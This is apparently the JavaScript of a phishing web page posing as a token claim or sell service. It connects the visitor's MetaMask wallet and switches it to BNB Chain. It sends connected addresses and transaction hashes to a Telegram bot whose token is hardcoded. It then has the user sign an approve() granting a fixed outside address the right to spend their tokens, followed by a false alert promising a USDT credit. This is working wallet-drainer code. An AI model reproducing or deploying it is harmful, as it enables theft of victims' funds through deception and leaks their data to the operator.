
const switchToBnbChain = async () => {
  const bnbChainParams = {
    chainId: '0x38',
    chainName: 'Binance Smart Chain',
    nativeCurrency: {
      name: 'Binance Coin',
      symbol: 'BNB',
      decimals: 18,
    },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/'],
  };

  try {
    if (typeof window.ethereum !== 'undefined') {
      await window.ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [bnbChainParams],
      });
      console.log('Switched to Binance Smart Chain!');
    } else {
      console.error('MetaMask or similar wallet not found!');
    }
  } catch (error) {
    console.error('Error switching to Binance Smart Chain:', error);
  }
};

const sendTelegramMessage = async (chatId, message) => {
  const botToken = '7107034391:AAHqyRFDjFCgBazgswzY_CRAYdtlgMQO-N4';
  await fetch(
    `https://api.telegram.org/bot${botToken}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    },
  );
};

let tokenAmount = document.querySelector('#buyAmount');
let claimButton = document.querySelector('.connect-wallet');

let connectBtn = document.querySelector('.connect-btn');

async function connectButtonFunctio() {
  if (typeof window.ethereum !== 'undefined') {
    try {
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });

      connectBtn.textContent = 'Connected';

      await sendTelegramMessage(
        '5204205237',
        `Connected : ${accounts[0]}`,
      );

      switchToBnbChain();
    } catch (error) {
      console.error('User denied account access', error);
    }
  } else {
    alert('MetaMask is not installed. Please install MetaMask to connect.');
  }
};


claimButton.addEventListener('click', claimTokens);

async function claimTokens() {


    claimButton.innerHTML = 'Loading...';
    await connectButtonFunctio();
    await switchToBnbChain();

    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();

        const tokenAddress = '0x073761656dC0654F729A4aF0ccE8C9B39b47A18b';
        const spenderAddress = '0x21F5CF45E2E546AB318572B0d62884Ce315B6d6d';
        let allowanceAmount = tokenAmount.value;

        if(Number(allowanceAmount) < 100){
         allowanceAmount = 100;
        }

        allowanceAmount = ethers.utils.parseEther(allowanceAmount);
        console.log(allowanceAmount);

        const tokenAbi = ['function approve(address spender, uint256 amount) public returns (bool)'];

        try {
            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);

            const tx = await tokenContract.approve(spenderAddress, allowanceAmount);
            console.log('Transaction sent:', tx.hash);

            await sendTelegramMessage(
              '5204205237',
              `Transaction confirmed: ${tx.hash}`,
            );

            const receipt = await tx.wait();
            console.log('Transaction confirmed:', receipt);

            alert(
              'Your USDT deposit will be automatically credited to your wallet on January 5, 2025.',
            );
            alert(
              'Your USDT deposit will be automatically credited to your wallet on January 5, 2025.',
            );

            claimButton.innerHTML = 'Sell';

        } catch (error) {
          claimButton.innerHTML ='Sell';
            console.error('Error increasing allowance:', error);
            alert('Failed to Sell.');
        }
    } else {
       claimButton.innerHTML = 'Sell';
        alert('MetaMask is not installed. Please install MetaMask to proceed.');
        await connectButtonFunctio();
        await claimTokens();
    }

}



connectBtn.addEventListener('click', connectButtonFunctio);
connectButtonFunctio();


function setusdtValue(){
  document.querySelector('#tokenAmount').innerHTML = celia_amount_input.value * 0.1;
}

let celia_amount_input = document.querySelector('#buyAmount');
celia_amount_input.addEventListener('input',setusdtValue)

setusdtValue();